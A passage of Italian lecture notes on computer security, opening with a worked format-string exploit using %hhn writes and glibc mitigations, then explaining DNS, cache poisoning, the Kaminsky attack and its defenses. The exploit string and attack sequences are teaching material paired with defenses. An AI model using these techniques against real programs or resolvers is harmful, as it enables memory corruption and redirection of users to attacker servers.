\begin{itemize}
    \item \texttt{\%hn} --- scrive i 2 byte meno significativi del counter (\textit{short});
    \item \texttt{\%hhn} --- scrive il byte meno significativo del counter (\textit{char}).
\end{itemize}

Usando \texttt{\%hhn} su 4 indirizzi consecutivi si può scrivere qualsiasi valore a 32 bit, un byte alla volta, con un incremento massimo del counter di 255 per ogni passo. Se il byte meno significativo del counter è $c$ e si vuole scrivere un valore $v < c$, non si può decrementare il counter, ma si può aggiungere $256 - c + v$ per ottenere il valore desiderato per overflow.

\paragraph{Esempio.} Si vuole scrivere il valore \texttt{0x44552233} all'indirizzo \texttt{0x01020304}, su un sistema a 32 bit con $o = 0$ e format string allineata alla stack line. Assumendo un output counter iniziale a 32 (dovuto alla parte di stringa che precede gli specificatori), la format string è:

\begin{verbatim}
"AAAA\x04\x03\x02\x01BBBB\x05\x03\x02\x01"
"CCCC\x06\x03\x02\x01DDDD\x07\x03\x02\x01"
"%36c%hhn%17c%hhn%205c%hhn%17c%hhn"
\end{verbatim}

\begin{itemize}
    \item \texttt{\%36c}: counter $\to 32 + 36 = 68 = \texttt{0x44}$; \texttt{\%hhn} scrive \texttt{0x44} a \texttt{0x01020304}
    \item \texttt{\%17c}: counter $\to 68 + 17 = 85 = \texttt{0x55}$; \texttt{\%hhn} scrive \texttt{0x55} a \texttt{0x01020305}
    \item \texttt{\%205c}: counter $\to 85 + 205 = 290$, LSB $= \texttt{0x22}$; \texttt{\%hhn} scrive \texttt{0x22} a \texttt{0x01020306}
    \item \texttt{\%17c}: counter $\to 290 + 17 = 307$, LSB $= \texttt{0x33}$; \texttt{\%hhn} scrive \texttt{0x33} a \texttt{0x01020307}
\end{itemize}

Le stringhe \texttt{"AAAA"}, \texttt{"BBBB"}, ecc. servono come argomenti fittizi per le istruzioni \texttt{\%mc} e per mantenere l'allineamento alla stack line; gli altri argomenti sono gli indirizzi dei singoli byte della locazione target, a partire dal meno significativo.

\subsection*{Mitigazioni}

Il compilatore \texttt{gcc} e la libreria \texttt{glibc} includono diverse mitigazioni per questo tipo di attacchi. Queste sono attivate quando la macro \texttt{\_FORTIFY\_SOURCE} è definita e il livello di ottimizzazione è almeno 1 (\texttt{-O} o superiore). La macro può essere impostata a \texttt{1} o \texttt{2}, con quest'ultimo valore che abilita controlli più severi.

Con \texttt{\_FORTIFY\_SOURCE=2}, le mitigazioni più rilevanti per le format string sono:

\begin{itemize}
    \item \texttt{glibc} termina il processo se una format string con accesso casuale agli argomenti non usa tutti gli argomenti;
    \item \texttt{glibc} termina il processo se una format string contenente l'operatore \texttt{\%n} viene letta da \textbf{memoria scrivibile} (condizione necessaria affinché l'attaccante possa controllarla).
\end{itemize}

Questi controlli rendono molto più difficili le forme più avanzate di sfruttamento, in particolare le scritture arbitrarie in memoria. I compilatori moderni emettono inoltre dei \textit{warning} quando le funzioni della famiglia \texttt{printf()} sono usate in modo potenzialmente insicuro; in \texttt{gcc} si abilitano con l'opzione \texttt{-Wformat-security}.


\section{Introduzione al DNS}

Il \textbf{Domain Name System (DNS)} è uno dei servizi fondamentali di
Internet. La sua funzione principale è tradurre i nomi di dominio leggibili
dall'uomo come \texttt{www.google.com}  negli indirizzi IP numerici
che le macchine usano per comunicare tra loro (es.\ \texttt{142.250.180.46}).

Senza il DNS ogni utente dovrebbe memorizzare direttamente gli indirizzi IP
dei siti che vuole visitare: un compito impraticabile su scala globale. Il
DNS può essere paragonato a una gigantesca \emph{rubrica telefonica}
distribuita di Internet.

Un dato significativo: il servizio viene eseguito circa \textbf{1.000 miliardi
di volte al giorno}. Per essere sostenibile a questa scala deve essere
estremamente veloce l'intera sequenza di 8 pacchetti si completa
tipicamente in meno di un secondo e non deve avere alcun singolo punto
di fallimento.


\section*{Struttura gerarchica dello spazio dei nomi}

Il DNS organizza i nomi in una \textbf{gerarchia ad albero}, la cui radice
è denominata \emph{root}. Scendendo dall'alto verso il basso si incontrano:

\begin{enumerate}[label=\textbf{\arabic*.}]
    \item \textbf{Root}: il livello apicale, gestito dai \emph{Root Name Server}.
    \item \textbf{Top-Level Domain (TLD)}: domini di primo livello, come
          \texttt{.com}, \texttt{.org}, \texttt{.net}, \texttt{.edu},
          \texttt{.gov} e i domini nazionali (\texttt{.it}, \texttt{.uk},
          \texttt{.fr}, \ldots).
    \item \textbf{Second-Level Domain}: il dominio registrato da
          un'organizzazione, es.\ \texttt{stanford} in \texttt{stanford.edu}.
    \item \textbf{Sottodomini}: ulteriori livelli gestiti dall'organizzazione,
          es.\ \texttt{cs} in \texttt{cs.stanford.edu}.
\end{enumerate}

\subsection*{Zona DNS}

Una \textbf{zona} (o dominio) è una collezione di coppie
\emph{hostname/indirizzo IP} gestite insieme da un'unica autorità
amministrativa. Ad esempio, la zona \texttt{unixwiz.net} comprende tutti
i record relativi a quel dominio: \texttt{www.unixwiz.net},
\texttt{mvp.unixwiz.net}, \texttt{cs.unixwiz.net}, e così via.


\section*{I server DNS e i loro ruoli}

Il sistema DNS è \textbf{distribuito}: nessuna singola macchina conosce
l'intera mappatura di Internet. Ogni server conosce la propria porzione e
sa come \emph{delegare} le query agli altri. Esistono quattro categorie
principali di server.

\subsection*{Root Name Server}

Sono i server al vertice della gerarchia. In Internet esistono \textbf{13
indirizzi logici} di root server (da \texttt{A.ROOT-SERVERS.NET} a
\texttt{M.ROOT-SERVERS.NET}), ma fisicamente la rete è composta da centinaia
di nodi replicati in tutto il mondo per garantire ridondanza e prossimità
geografica. I loro indirizzi IP sono quasi fissi e vengono distribuiti
direttamente con il software DNS.

I root server non conoscono gli indirizzi dei singoli host, ma sanno a quali
server TLD bisogna rivolgersi per ogni dominio di primo livello. Quando
ricevono una query che non possono risolvere direttamente, rispondono con
un \emph{referral}: l'indicazione del prossimo server da interrogare.

\subsection*{TLD Server (Top-Level Domain)}

I server TLD sono responsabili di specifici domini di primo livello.
Quando un root server riceve una query per \texttt{www.unixwiz.net}, risponde
con i server TLD competenti per il dominio \texttt{.net} (i \emph{Global TLD
server}, detti GTLD). Il GTLD non conosce la risposta finale, ma sa quali
sono i nameserver autoritativi per \texttt{unixwiz.net} e li indica come
passo successivo.

\subsection*{Authoritative Name Server}

Ogni organizzazione mantiene (o delega a un provider) uno o più
\textbf{authoritative name server} per i propri domini. Questo server
contiene i record DNS definitivi, ovvero le associazioni
\emph{hostname $\to$ indirizzo IP} per tutti gli host di quella zona.

La maggior parte delle università e delle grandi aziende implementa e
mantiene un authoritative name server \textbf{primario} e uno
\textbf{secondario} (backup). In alternativa è possibile affidarsi a server
autoritativi di provider esterni.

Quando un authoritative server risponde a una query, il flag
\textbf{AA (Authoritative Answer)} nel pacchetto di risposta viene impostato
a 1, a conferma che la risposta proviene da una fonte fidata per quella zona.

\subsection*{Local Name Resolver (Recursive Resolver)}

È il componente con cui il client interagisce direttamente. Normalmente è
fornito dall'ISP. Questo server:

\begin{itemize}
    \item riceve la query dal client;
    \item se conosce già la risposta (dalla cache locale), la restituisce
          immediatamente;
    \item altrimenti interroga la gerarchia DNS
          (root $\to$ TLD $\to$ authoritative) e riporta il risultato al client.
\end{itemize}

I resolver usano \textbf{query ricorsive} verso il client e \textbf{query
iterative} verso gli altri server della gerarchia.


\section*{Terminologia chiave}

\begin{description}[leftmargin=2.5cm, style=nextline]
    \item[Nameserver] Software server che risponde alle domande DNS. Può essere
        \emph{authoritative} (conosce direttamente la risposta) oppure
        \emph{ricorsivo} (la ricerca per conto del client). I principali
        software che implementano questo servizio sono \textbf{BIND},
        \textbf{PowerDNS} e \textbf{djbdns}.
    \item[Resolver] La componente \emph{client} del DNS, ovvero una libreria
        compilata all'interno dei programmi (es.\ \texttt{gethostbyname()} in
        UNIX). Sa come formulare e inviare una query al nameserver locale.
    \item[Resource Record (RR)] Il DNS è un database di resource record.
        Ogni record ha la forma:
        \begin{center}
            \texttt{(Name, Value, Type, TTL)}
        \end{center}
        dove il \textbf{TTL} (Time To Live) indica per quanti secondi il
        record può essere tenuto in cache prima di essere considerato scaduto.
\end{description}


\section*{Tipi di Resource Record}

Il DNS non si limita a mappare nomi in indirizzi IP, ma gestisce diversi
tipi di record, ognuno con uno scopo specifico:

\begin{description}[leftmargin=2cm, style=nextline]
    \item[\texttt{A}] \textbf{Address record.} Associa un hostname a un
        indirizzo IPv4. È il tipo di record più comune.
    \item[\texttt{NS}] \textbf{Name Server.} Indica quale nameserver è
        autoritativo per una determinata zona, puntando a un altro server.
    \item[\texttt{MX}] \textbf{Mail eXchanger.} Specifica il server
        responsabile della ricezione delle email per un dominio.
    \item[\texttt{CNAME}] \textbf{Canonical Name.} Definisce un alias: associa
        un nome alternativo a un nome canonico (funziona come un collegamento
        simbolico nei file system).
    \item[\texttt{SOA}] \textbf{Start of Authority.} Contiene metadati sulla
        zona: il server primario, il contatto amministrativo, i parametri di
        refresh e cosa fare se il master non è raggiungibile.
    \item[\texttt{TXT}] \textbf{Text.} Campo testuale generico, usato ad
        esempio per distribuire chiavi pubbliche del sito (DKIM) o per
        verifiche di proprietà del dominio.
\end{description}


\section*{Tipi di query DNS}

Esistono due modalità principali con cui i server DNS si scambiano
informazioni.

\subsection*{Query ricorsiva}

Il server che riceve la query si fa carico di trovare la risposta completa,
interrogando altri server se necessario. Restituisce sempre una \textbf{risposta
definitiva}, mai un semplice riferimento. È il tipo di query che i client
inviano al proprio resolver locale.

\subsection*{Query iterativa}

Il server risponde con il meglio che conosce: se ha la risposta la fornisce,
altrimenti restituisce un \textbf{referral}, ovvero l'indirizzo del prossimo
server da interrogare. Il chiamante dovrà fare una nuova query a quel server.
È il tipo di query che i resolver usano quando risalgono la gerarchia DNS.

\medskip
\noindent
In sintesi: il client fa una \emph{query ricorsiva} al proprio resolver; il
resolver fa \emph{query iterative} verso root, TLD e authoritative server,
raccoglie la risposta e la riporta al client.

Descrizione passo per passo:

\begin{enumerate}[label=\Circled{\arabic*}]
    \item \textbf{Il client interroga il resolver locale.} Il browser chiama
        \texttt{gethostbyname("www.cs.stanford.edu")}. Il resolver verifica
        prima la cache: se il record è presente e non scaduto, risponde
        immediatamente. Altrimenti procede.

    \item \textbf{Il resolver interroga un Root Name Server.} Il resolver
        conosce i 13 root server (inclusi nel software DNS) e ne sceglie uno
        a caso. Il root server non conosce la risposta, ma risponde con un
        referral ai server TLD per \texttt{.edu}.

    \item \textbf{Il resolver interroga il TLD \texttt{.edu}.} Il TLD server
        non conosce direttamente \texttt{cs.stanford.edu}, ma conosce i
        nameserver autoritativi per \texttt{stanford.edu} e fornisce un
        ulteriore referral.

    \item \textbf{Il resolver interroga il server autoritativo di
        \texttt{stanford.edu}.} Questo server risponde con i nameserver
        responsabili del sottodominio \texttt{cs.stanford.edu}.

    \item \textbf{Il resolver ottiene la risposta finale.} Interrogato il
        server autoritativo per \texttt{cs.stanford.edu}, il resolver riceve
        il record \texttt{A} con l'indirizzo IP cercato. Il flag \texttt{AA=1}
        nella risposta conferma che si tratta di una risposta autorevole.

    \item \textbf{Il resolver risponde al client e aggiorna la cache.}
        L'indirizzo IP viene restituito al client e memorizzato in cache per
        il periodo indicato dal TTL del record.
\end{enumerate}

\paragraph*{Nota sulla sicurezza.}
Un nameserver potrebbe teoricamente dichiararsi autoritativo per qualsiasi
zona, anche quelle che non possiede (es.\ \texttt{bancaitalia.it}). Tuttavia
questo non ha alcun effetto pratico, perché nessun server di livello superiore
lo delega mai per quella zona. La gerarchia delle deleghe è il meccanismo
fondamentale di fiducia del DNS.

\section*{Risoluzione inversa}

Il DNS viene utilizzato anche in direzione opposta: partendo da un
\textbf{indirizzo IP}, si vuole risalire al corrispondente \emph{hostname}
(reverse DNS lookup).

Per realizzarlo esiste un dominio speciale: \texttt{in-addr.arpa}. Gli
indirizzi IP vengono scritti in \textbf{ordine inverso} e appesi a questo
dominio. Ad esempio, per trovare il nome associato all'IP
\texttt{64.170.162.98}, si cerca il record \texttt{PTR} di:

\begin{center}
    \texttt{98.162.170.64.in-addr.arpa}
\end{center}

L'ordine invertito è necessario perché nella gerarchia DNS la parte più
generale si trova a \emph{destra} (come nei nomi di dominio), mentre negli
indirizzi IP la parte più generale è a \emph{sinistra}.


\section*{Struttura dei messaggi DNS}

Ogni messaggio DNS --- sia esso una query o una risposta --- è composto da
\textbf{cinque sezioni}:

\begin{enumerate}[label=\textbf{\arabic*.}]
    \item \textbf{Header section}: tipo del messaggio, flag di controllo e
        contatori per le sezioni successive.
    \item \textbf{Question section}: nome richiesto, tipo di record e classe
        (quasi sempre \texttt{IN} = Internet). Il numero di domande è quasi
        sempre pari a 1.
    \item \textbf{Answer section}: resource record che rispondono alla query.
    \item \textbf{Authority section}: record \texttt{SOA} o \texttt{NS} che
        indicano i server autoritativi per la zona.
    \item \textbf{Additional section}: informazioni aggiuntive utili al client,
        ad esempio gli indirizzi IP dei nameserver già citati nella sezione
        Authority.
\end{enumerate}

I server DNS sono in ascolto sulla \textbf{porta 53/UDP} per le query
standard. Il protocollo TCP viene impiegato quando la risposta supera la
dimensione massima del datagramma UDP, o per i trasferimenti di zone intere.

\subsection*{Campi principali dell'header DNS}

\begin{description}[leftmargin=3cm, style=nextline]
    \item[Query ID / TXID] Identificatore univoco di 16 bit generato dal
        client. Permette di associare ogni risposta alla query corrispondente,
        essenziale in un contesto UDP senza connessione.
    \item[QR] 0 se il messaggio è una query, 1 se è una risposta.
    \item[Opcode] Tipo di query: 0 per una query standard.
    \item[AA] \emph{Authoritative Answer}: 1 se la risposta proviene
        direttamente dal server autoritativo per quella zona.
    \item[RD] \emph{Recursion Desired}: impostato dal client per indicare
        che desidera una risposta ricorsiva.
    \item[RA] \emph{Recursion Available}: impostato dal server per indicare
        che supporta la ricorsione.
    \item[RCODE] Codice di ritorno: 0 per successo, altri valori per diversi
        tipi di errore.
\end{description}


\section*{Ottimizzazioni del DNS}

Il DNS sfrutta due principi classici dell'informatica per gestire l'enorme
volume di richieste giornaliere.

\subsection*{Caching e TTL}

Ogni resolver memorizza in una \textbf{cache} locale le risposte ottenute,
per un tempo definito dal campo \textbf{TTL} (Time To Live) del resource
record. Finché il TTL non scade, il resolver risponde direttamente dalla
cache senza dover risalire la gerarchia. Questo sfrutta la
\emph{temporal locality}: gli stessi domini vengono interrogati
ripetutamente nel tempo.

Quando un resolver risponde dalla cache, il flag \texttt{AA} nella risposta
non è impostato (risposta \emph{non-authoritative}). Il client riceve comunque
l'informazione corretta, ma essa potrebbe essere vecchia al massimo quanto
il TTL.

\subsection*{Replica e prossimità geografica}

Il DNS sfrutta anche la \emph{spatial locality}: i computer locali vengono
interrogati più frequentemente di quelli remoti. I server vengono replicati
geograficamente e il client viene indirizzato al nodo fisicamente più vicino
(o con minor latenza). Questo è il motivo per cui i 13 indirizzi logici dei
root server corrispondono in realtà a centinaia di istanze fisiche distribuite
nel mondo.


\section{Il Caching DNS e perché è un bersaglio}

Quando un resolver ottiene la risposta a una query, la \textbf{memorizza in
cache} per evitare di dover risalire ogni volta la gerarchia DNS. Vengono
messi in cache sia i record positivi (un hostname che esiste) sia i record
negativi (un hostname che non esiste, ad esempio per un errore di battitura).
Ogni record porta con sé un valore \textbf{TTL (Time To Live)}: passato quel
tempo, il record viene considerato scaduto e alla successiva richiesta il
resolver deve rieseguire la query.

Il caching è molto utile per le prestazioni, ma introduce un rischio serio:
se un attaccante riesce a inserire nella cache del resolver un record
\emph{falso}, tutti i client che si appoggiano a quel resolver riceveranno
l'indirizzo IP sbagliato --- senza accorgersene --- per tutto il tempo del TTL.
Questo è esattamente l'obiettivo del \textbf{cache poisoning}.

% ---------------------------------------------------------------
\section{Cache Poisoning: il concetto di base}

Lo scopo dell'attacco è \textbf{inserire informazioni false nella cache di un
nameserver ricorsivo}. Tutti i client di quel resolver riceveranno indirizzi
IP fasulli per il nome bersaglio, inconsapevolmente e per l'intera durata
del TTL impostato dall'attaccante.

\subsection{Come il DNS si protegge (in teoria)}

Il DNS non accetta qualsiasi risposta che arriva: applica quattro controlli
prima di ritenere valida una risposta.

\begin{enumerate}[label=\textbf{\arabic*.}]
    \item \textbf{Risposta a query in attesa.} Il resolver accetta solo
        risposte a query che ha effettivamente inviato. Qualsiasi risposta
        non sollecitata viene ignorata.

    \item \textbf{Stessa porta UDP.} La risposta deve arrivare sulla stessa
        porta UDP su cui il resolver stava aspettando. Questo limita la
        possibilità dell'attaccante di iniettare pacchetti a caso.

    \item \textbf{Match della Question section.} La risposta DNS contiene
        una copia della domanda originale. Il resolver verifica che
        corrispondano esattamente: nome, tipo di record e classe.

    \item \textbf{Match del Query ID (TXID).} Ogni query DNS porta un
        identificatore a 16 bit (65.536 valori possibili). La risposta deve
        contenere lo stesso TXID per essere accettata.
\end{enumerate}

Esiste anche il cosiddetto \textbf{bailiwick checking}: le sezioni
\emph{Authority} e \emph{Additional} della risposta devono contenere solo
informazioni relative allo stesso dominio della query. Questo impedisce a un
nameserver di rispondere, ad esempio, alla query per \texttt{www.unixwiz.net}
includendo anche record falsi per \texttt{BankOfSteve.com}.

\begin{enumerate}[label=\Circled{\arabic*}]
    \item L'attaccante fa una query legittima su un dominio che controlla
        (es.\ \texttt{test.badguy.com}), in modo da osservare il Query ID
        corrente usato dal resolver vittima --- o semplicemente annusa il
        traffico di rete.

    \item Sapendo che il prossimo Query ID sarà $N{+}1$, l'attaccante
        \textbf{inonda il resolver} con risposte false che contengono:
        l'IP del proprio server web, il Query ID previsto e i dati corretti
        nella sezione Question (nome del sito bersaglio).

    \item Se una di queste risposte false arriva al resolver
        \emph{prima} di quella del nameserver legittimo, il resolver la
        accetta e la mette in cache.

    \item Da questo momento, chiunque chieda al resolver quell'indirizzo
        riceve l'IP dell'attaccante.
\end{enumerate}

\paragraph{Condizioni necessarie per l'attacco.}
\begin{itemize}
    \item Il nome bersaglio \emph{non deve} essere già in cache (altrimenti
        il resolver non fa nessuna query e bisogna aspettare la scadenza del
        TTL).
    \item L'attaccante deve essere \emph{più veloce} del nameserver legittimo:
        se vittima e nameserver reale sono vicini in rete, la finestra
        temporale è molto ridotta.
    \item Bisogna indovinare correttamente il Query ID.
\end{itemize}

\section{Attacco di Kaminsky: attaccare i record Authority}

Nel 2008 Dan Kaminsky rese pubblica una variante molto più efficace. Il
problema dei vecchi attacchi era che, se il nome bersaglio era già in cache,
bisognava aspettare la scadenza del TTL prima di ritentare. Kaminsky aggirò
questo limite in modo elegante.

\subsection{L'idea chiave}

Invece di prendere di mira direttamente \texttt{www.bankofsteve.com},
l'attaccante punta ai \textbf{record di delega} (record NS nella sezione
Authority). Se riesce a far credere al resolver vittima che il nameserver
autoritativo per \texttt{bankofsteve.com} è il proprio server, \emph{controlla
tutta la zona}, non solo un singolo nome.

\subsection{Sequenza dell'attacco}

\begin{enumerate}[label=\Circled{\arabic*}]
    \item L'attaccante chiede al resolver vittima un nome \textbf{casuale e
        inesistente} all'interno del dominio bersaglio, ad esempio
        \texttt{www12345678.bankofsteve.com}. Un nome casuale non sarà mai
        in cache, quindi il resolver deve per forza fare una nuova query.

    \item Mentre il resolver sta aspettando la risposta legittima,
        l'attaccante inonda il resolver con \textbf{risposte false} che
        dicono: ``non so la risposta, ma il nameserver autoritativo per
        \texttt{bankofsteve.com} è \texttt{ns1.bankofsteve.com}'', con il
        campo \emph{glue} (sezione Additional) che punta all'IP del server
        dell'attaccante.

    \item Se il resolver accetta una di queste risposte false, aggiorna la
        propria cache: ora crede che \textbf{il nameserver dell'attaccante
        sia autoritativo per l'intera zona} \texttt{bankofsteve.com}.

    \item L'attaccante ripete il procedimento con un nuovo nome casuale se
        il primo tentativo fallisce, senza dover aspettare nessun TTL.
\end{enumerate}

\subsection{Perché è così pericoloso}

Controllare il nameserver autoritativo nella cache del resolver significa
controllare \emph{tutto ciò che riguarda quel dominio}:
\begin{itemize}
    \item si possono ridirigere i visitatori del sito web verso un server
        falso (phishing);
    \item si possono dirottare le email verso propri server tramite falsi
        record MX;
    \item impostando un TTL altissimo, i dati falsi rimangono in cache molto
        a lungo;
    \item l'attacco può essere portato anche contro domini di alto livello
        come \texttt{.com} o \texttt{.net}, dirottando potenzialmente tutti
        i nomi sotto quel TLD.
\end{itemize}

\paragraph{Efficacia statistica.}
Con il Query ID a 16 bit ci sono 65.536 valori possibili. Se per ogni nome
casuale l'attaccante invia 50 risposte false prima che arrivi quella
legittima, la probabilità di successo su un singolo tentativo è circa
$50/65536 \approx 0{,}08\%$. Sembra bassa, ma ripetendo l'attacco su
nomi casuali diversi (che non sono mai in cache) il successo si raggiunge
in pochi secondi, come dimostrò Kaminsky.

\section{Triggering: come far partire una query}

Un elemento spesso sottovalutato è che l'attaccante deve \emph{far sì} che
il resolver vittima emetta una query per il dominio bersaglio. In realtà
ci sono molti modi per innescare un lookup DNS senza che la vittima se ne
accorga:

\begin{itemize}
    \item \textbf{Ogni link o immagine} in una pagina web causa un DNS
        lookup verso il dominio che ospita la risorsa. Non è necessario
        JavaScript: basta un semplice tag \texttt{<img>}.
    \item \textbf{I mail server} eseguono lookup DNS in molti momenti:
        durante il saluto iniziale (\texttt{HELO}), per verificare il
        mittente (\texttt{MAIL FROM}), durante i controlli anti-spam,
        e quando tentano di consegnare email o rimbalzarle.
\end{itemize}

\section{Difese contro il Cache Poisoning}

\subsection{Randomizzazione della porta UDP (Source Port Randomization)}

Invece di usare sempre la stessa porta per le query in uscita, il resolver
sceglie una \textbf{porta casuale} ogni volta. In questo modo l'attaccante
deve indovinare non solo il Query ID (16 bit) ma anche la porta (altri 11
bit circa di entropia effettiva), portando lo spazio delle combinazioni da
65.536 a circa 136 milioni. Un attacco che prima durava secondi richiede
ore.

\subsection{Doppia query}

Si potrebbe richiedere ogni nome due volte e accettare la risposta solo se
il Query ID corrisponde in entrambe le query. L'attaccante dovrebbe indovinare
due Query ID separati (32 bit totali di entropia), rendendo l'attacco
praticamente impossibile. Il limite di questo approccio è l'overhead: ogni
risoluzione richiede il doppio delle query.

\subsection{Bailiwick checking più rigoroso}

Le cache devono scartare qualsiasi informazione su domini che non rientrano
nell'ambito della risposta ricevuta. Ad esempio, se si riceve una risposta
da un nameserver di \texttt{nasty.dom} che include record glue che puntano
a \texttt{yahoo.com}, quei record devono essere ignorati a meno che non
provengano dai server autoritativi di \texttt{yahoo.com} stesso, dai server
\texttt{.com} o dai root server.

\subsection{DNSSEC (soluzione definitiva)}

Nessuna delle difese precedenti è completamente sicura perché il problema
di fondo è che \textbf{il DNS non autentica le risposte}. La soluzione
strutturale è \textbf{DNSSEC (DNS Security Extensions)}: ogni risposta DNS
viene \emph{firmata crittograficamente} dal possessore della zona. Il
resolver può verificare la firma e, se non corrisponde, scartare la
risposta indipendentemente dal fatto che Query ID e porta siano corretti.
Purtroppo DNSSEC non è ancora adottato universalmente.

\section{Reverse DNS Spoofing}

Storicamente, alcuni sistemi Unix concedevano accesso remoto (tramite
\texttt{rsh} o \texttt{rlogin}) sulla base del \emph{nome host} del client,
registrato nel file \texttt{.rhosts}. Il flusso era:

\begin{enumerate}[label=\textbf{\arabic*.}]
    \item Arriva una connessione da un indirizzo IP numerico.
    \item Il sistema esegue un \textbf{reverse DNS lookup} per ricavare il
        nome host associato all'IP.
    \item Se quel nome è in \texttt{.rhosts}, l'accesso viene concesso.
\end{enumerate}

Se un attaccante riesce ad alterare la risposta al reverse lookup (ad esempio
tramite cache poisoning), il sistema bersaglio crederà che la connessione
provenga da un host autorizzato. Il problema è che non esiste
\emph{double-checking}: il sistema non verifica se il nome host ottenuto
dal reverse lookup si risolve di nuovo nell'indirizzo IP originale
(\emph{forward-confirmed reverse DNS}). Questa tecnica di difesa, se
implementata, avrebbe reso l'attacco molto più difficile.

\section{Altri attacchi ai nameserver}

\begin{description}[leftmargin=3cm, style=nextline]
    \item[DOS ``exploit to fail''] Sfrutta una vulnerabilità in un componente
        dell'infrastruttura DNS per causare l'interruzione del servizio di
        risoluzione. Il nameserver smette di rispondere.

    \item[DOS ``exploit to own''] Sfrutta una vulnerabilità per ottenere
        privilegi amministrativi sul server. L'attaccante non si limita a
        bloccare il servizio ma lo controlla.

    \item[Reflection \& Amplification] Attacco DDoS distribuito. L'attaccante
        invia query DNS con l'indirizzo IP della vittima come mittente
        (IP spoofing). I server DNS rispondono alla vittima, amplificando il
        traffico: una piccola query può generare una risposta molto più grande
        (amplification factor). La vittima viene inondata da traffico che
        non ha richiesto.

    \item[Cache exhaustion] L'attaccante inonda il resolver con query per nomi
        inesistenti. Il resolver tenta di risolverli, riceve risposte
        \texttt{NXDOMAIN} (nome non trovato) e le mette in cache. La cache
        si riempie di risposte inutili, riducendo la capacità di elaborare
        query legittime.
\end{description}
